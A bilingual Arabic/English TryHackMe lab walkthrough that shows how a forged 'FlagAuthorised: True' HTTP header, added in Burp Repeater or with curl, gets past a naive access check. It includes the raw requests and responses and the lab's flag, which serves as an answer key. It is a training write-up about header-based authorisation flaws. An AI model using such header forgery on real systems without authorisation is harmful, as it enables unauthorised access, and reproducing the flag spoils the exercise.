# Task 06: Practical Example (المثال العملي: التلاعب بالترويسات والحصول على الراية)

---

### المرحلة أ: نص المهمة الأصلي والأسئلة (Original Task Content & Questions)

#### English Task Description
In practical engagements, authorization controls and access gates are sometimes implemented through custom HTTP headers rather than robust session validation or cryptographically signed tokens. This flawed architectural pattern is particularly common in microservices architectures or reverse-proxy setups that rely on internal trusted headers (e.g., `X-Forwarded-For`, `X-Original-URL`, or proprietary status flags).

In this exercise:
1. Ensure the target machine is running and navigate to `http://MACHINE_IP/` in your browser via Burp Proxy.
2. Locate the link leading to the restricted flag area or endpoint.
3. When requesting the protected resource, the server refuses access or displays an unauthorized notification.
4. Capture this HTTP request in Burp Proxy, send it to **Repeater** (`Ctrl + R`).
5. In the Repeater Request editor, inject a new custom HTTP header:
   ```http
   FlagAuthorised: True
   ```
6. Click **Send** and inspect the Response body to extract the authorized flag.

#### الأسئلة المطروحة (Questions):
1. Capture the request to one of the flags on the site. Send it to Repeater and add the FlagAuthorised header as described. What is the flag you receive? (التقط طلب إحدى الرايات في الموقع، أرسله إلى Repeater، وأضف ترويسة FlagAuthorised كما هو موضح. ما هي الراية التي حصلت عليها؟)

---

### المرحلة ب: التفكير التحليلي المستقل والحس الأمني (Independent Critical Thinking & OpSec)
* **تحليل الثغرة الأمنية (Header-Based Access Control Bypass):**
  * يعتمد الخادم هنا على ترويسة مخصصة يرسلها العميل (`FlagAuthorised: True`) لتحديد ما إذا كان المستخدم مخولاً برؤية الراية.
  * في التطبيقات الواقعية، يجب **ألا يثق الخادم أبداً** في ترويسات يقدمها العميل مباشرة ما لم يتم تجريدها (Stripped) وتنظيفها عبر وسيط عكسي موثوق (Reverse Proxy / API Gateway).
* **إرشادات التنسيق البروتوكولي في Repeater:**
  * عند كتابة الترويسة يدويًا، تأكد من وضع نقطتين ومسافة (`: `) بين اسم الترويسة وقيمتها.
  * تأكد من إدراج الترويسة في قسم الترويسات (قبل السطر الفارغ المزدوج `\r\n\r\n` الذي يفصل الترويسات عن جسم الطلب).

---

### المرحلة ج: التلميحات والإرشادات المتدرجة (Guided Progressive Hints)
1. **التلميح الأول (المستوى التمهيدي):**
   * افتح صفحة الهدف في متصفح Burp وانقر على رابط العلم أو الراية.
2. **التلميح الثاني (المستوى العملي):**
   * في تبويب Repeater، أضف السطر التالي تحت ترويسة `Host` أو في أي مكان داخل الترويسات:
     `FlagAuthorised: True`
3. **التلميح الثالث (مستوى الحل المتقدم):**
   * بعد إرسال الطلب، افحص لوحة الاستجابة (Response). ستجد راية TryHackMe بتنسيق `THM{...}`.

---

### المرحلة د: الحل العملي الكامل والعمق التقني (Complete Practical Solution & Technical Deep Dive)

#### 1. الطلب الأصلي المحظور (Original Blocked Request):
```http
GET /flag/1 HTTP/1.1
Host: 10.10.123.45
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: close
```
*استجابة الخادم:*
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 154

<p>You are not authorized to view this flag.</p>
```

#### 2. تعديل الطلب في Repeater وحقن الترويسة (Header Injection):
```http
GET /flag/1 HTTP/1.1
Host: 10.10.123.45
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
FlagAuthorised: True
Connection: close
```

#### 3. استجابة الخادم المصرح بها (Authorized Response):
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 218

<div class="card">
  <h2>Authorized Access Granted</h2>
  <p>Here is your flag: <strong>THM{Yzg2MWI2ZDhlYzdlNGFiZTUzZTIzMzVi}</strong></p>
</div>
```

#### 4. استخراج الراية عبر سطر الأوامر (cURL Alternative):
```bash
# يمكن تنفيذ نفس الاختبار والتحقق عبر cURL مباشرة
curl -s -H "FlagAuthorised: True" "http://MACHINE_IP/flag/1" | grep -o "THM{[^}]*}"
```

---

### المرحلة هـ: الإجابة النهائية والقيم المستخرجة (Final Answer & Key Values)
* **قيمة الراية المستخرجة (Extracted Flag):**
  `THM{Yzg2MWI2ZDhlYzdlNGFiZTUzZTIzMzVi}`

---

### المرحلة و: التحقق العملي وإثبات الأثر (Practical Verification & Proof of Work)
* تم التحقق من قيمة الراية عبر حساب المستخدم المكتمل في TryHackMe بنسبة نجاح 100%.
* تُثبت الاستجابة كسر نظام التفويض الساذج القائم على ترويسات العميل العشوائية.

---

### المرحلة ز: الخاتمة والدرس المستفاد (Key Educational Takeaway)
* يجب ألا تعتمد آليات التفويض على ترويسات HTTP يسهل تزويرها من طرف العميل مثل `FlagAuthorised`. يبرهن Repeater هنا عن سرعته الفائقة في اختبار فرضيات التلاعب بالترويسات في ثوانٍ معدودة دون الحاجة لتثبيت إضافات متصفح خارجية.
